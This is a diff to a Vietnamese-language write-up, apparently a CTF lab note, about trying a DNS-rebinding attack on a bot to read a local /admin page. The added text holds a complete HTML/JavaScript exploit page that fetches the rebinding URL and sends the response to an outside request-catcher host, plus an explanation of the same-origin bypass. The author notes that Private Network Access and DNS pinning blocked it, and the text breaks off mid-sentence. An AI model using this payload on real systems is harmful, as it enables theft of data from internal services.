@@ -9,7 +9,9 @@ https://hacktricks.wiki/ja/pentesting-web/xss-cross-site-scripting/xss-informati
 
 https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html
 
+https://developer.chrome.com/blog/private-network-access-update-2024-03
 
+https://security.stackexchange.com/questions/14038/does-dns-pinning-protect-against-all-dns-rebinding-attacks
 
 
 ---
@@ -61,8 +63,46 @@ Mình đã thử thêm một số header tùy chỉnh như kiểu X-Forwarded-Fo
 
 Thế thì mình mới tiến hành tấn công thử theo hướng DNS Rebinding. Mình dựng VPS, sau đó viết payload CSRF dạng:
 
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit Page</title>
+</head>
+<body>
+    <script>
+        const REBIND_URL = 'http://make-104.64.219.249-rebindfor10safter2times-127.0.0.1-rr.1u.ms:9090/admin';
+        const EXFIL_DOMAIN = 'http://5dfrew66.requestrepo.com';
 
+        new Image().src = `${EXFIL_DOMAIN}/log?status=page_loaded`;
+
+        setTimeout(function() {
+            fetch(REBIND_URL)
+                .then(res => res.text())
+                .then(text => {
+                    new Image().src = `${EXFIL_DOMAIN}/log?data=` + encodeURIComponent(text);
+                })
+                .catch(e => {
+                    new Image().src = `${EXFIL_DOMAIN}/log?error=fetch_blocked`;
+                });
+            new Image().src = REBIND_URL;
+        }, 1000);
+    </script>
+</body>
+</html>
+```
+Host trên VPS của mình. Cơ chế thì nó khá đơn giản, Bot vào trang:
 http://make-104.64.219.249-rebindfor10safter2times-127.0.0.1-rr.1u.ms:9090/
+mà mình gửi. Lúc này DNS trả về ip VPS của mình, bot load được trang trên server mình.
+Đoạn mã Javascript trên server của mình liên tục fetch nội dung trang chính nó rồi gửi nội dung về RequestRepo (Trang bắt request tương tự webhook).
+
+Bản chất cách này bypass được SOP vì khi TTL của bản ghi địa chỉ IP trả về từ http://make-104.64.219.249-rebindfor10safter2times-127.0.0.1-rr.1u.ms:9090/ thay đổi liên tục, mà trong mã Javascript của mình thì cứ 1s sẽ lại gửi về server nội dung trang. Nếu đúng lúc DNS trả về 127.0.0.1 thì ngon luôn, lúc này nó biến thành 127.0.0.1:9090/admin -> mình đọc được nội dung của /admin; do là SOP đối chiếu Host hiện tại với URL trong fetch() -> thấy giống (URL vẫn vậy, chỉ bản ghi IPv4 trả về là khác) nên thành công.
+
+Tưởng  vậy là đã xong nhưng mình test mãi mà ko hiểu sao chỉ xem được nội dung của chính trang được host trên VPS của mình. Khá cay cú 😠
+
+Mình tìm hiểu ra thì biết trình duyệt hiện đại có cơ chế PNA (Private Network Access): https://developer.chrome.com/blog/private-network-access-update-2024-03 và DNS Pinning: https://security.stackexchange.com/questions/14038/does-dns-pinning-protect-against-all-dns-rebinding-attacks.
+Mình thấy khó quá, không cách nào vượt qua được nên
+
 
 ![[Attachments/Pasted image 20261101141502.png]]
 
